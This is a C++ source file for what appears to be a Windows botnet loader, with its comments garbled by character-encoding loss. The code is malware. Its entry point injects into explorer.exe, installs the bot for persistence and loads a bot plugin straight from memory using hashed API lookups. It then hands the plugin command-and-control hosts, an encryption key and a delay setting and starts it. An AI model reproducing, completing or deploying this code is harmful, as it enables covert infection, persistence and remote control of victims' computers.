#include <windows.h>

#include "BotCore.h"
#include "DLLLoader.h"
#include "Inject.h"
#include "Installer.h"

#pragma comment(linker, "/ENTRY:LoaderMain" )



char  DropperName[MAX_PATH];  // ��� ��� ����������� �����
DWORD DropperPID = 0; // PID ������� ����


typedef BOOL (WINAPI *TSetBotParameter)(DWORD ParamID, PCHAR Param);
TSetBotParameter SetParam;


//---------------------------------------------
// ������� ������� ��������� �������� ���������
//---------------------------------------------
bool DoSetParam(PCHAR Buf, DWORD BufSize, DWORD Id)
{
	bool Result = false;
	if (GetBotParameter(Id, Buf, BufSize))
		Result = SetParam(Id, Buf) != FALSE;
	return Result;
}

//---------------------------------------------
// ������� �������������� ��������� �������
//---------------------------------------------
bool SetBotPlugParams(LPVOID Handle)
{
	// �������� ������� ��������� ���������
	SetParam = (TSetBotParameter)MemoryGetProcAddress(Handle, 0xA336A349 /* SetBotParameter */);
	if (!SetParam) return false;

	const DWORD BufSize = MAX_MAINHOSTS_BUF_SIZE * 2; // ����� ����������� � �������
	char Buf[BufSize];

	bool Result = DoSetParam(Buf, BufSize, BOT_PARAM_PREFIX) &&
		          DoSetParam(Buf, BufSize, BOT_PARAM_HOSTS) &&
				  DoSetParam(Buf, BufSize, BOT_PARAM_KEY) &&
				  DoSetParam(Buf, BufSize, BOT_PARAM_DELAY);
	return Result;
}


//---------------------------------------------
//  ������� ��������� ������
//---------------------------------------------
void StartBotPlug(LPVOID Buf)
{
	 LPVOID Handle = MemoryLoadLibrary(Buf,  false);
	if (Handle)
	{
		typedef void (WINAPI *TStart)(BOOL Initialize, BOOL Start, BOOL IsLoaderPlugin);
		TStart Start = (TStart)MemoryGetProcAddress(Handle, 0x3E987971 /* Start */);
		if (Start)
		{
			// �������������� ������
			Start(TRUE, FALSE, TRUE);
			// ������������� ���������
			SetBotPlugParams(Handle);
			// �������� �����
			Start(FALSE, TRUE, TRUE);
		}
	} 
}




//---------------------------------------------------------------------
//  ������� �������� �������
//---------------------------------------------------------------------
DWORD WINAPI ExplorerMainProc(LPVOID)
{
	// ��������� dll 
	BOT::Initialize();
	// ��������� ������� �������������� � ��������� �������
	BOT::TryCreateBotInstance();
	// ����������� �����
	Install(DropperName, FALSE, TRUE, DropperPID);  

	// �������� ������
	LPVOID Plugin;
	if (LoadBotPlug(&Plugin, NULL))
	{
		StartBotPlug(Plugin);
		FreeBotPlug(Plugin);
	}
	return 0; 
}




//---------------------------------------------------------------------
//  �������� ������� txe  
//---------------------------------------------------------------------
int APIENTRY LoaderMain() 
{
	// �������� ��� �������
	BOT::Initialize();
	if (!BOT::IsRunning())
	{
		DropperPID = GetCurrentProcessId();
		GetModuleFileNameA(NULL, DropperName, MAX_PATH);
		InjectIntoExplorer(ExplorerMainProc);
	}

	ExitProcess(0); 
	return 0;
}



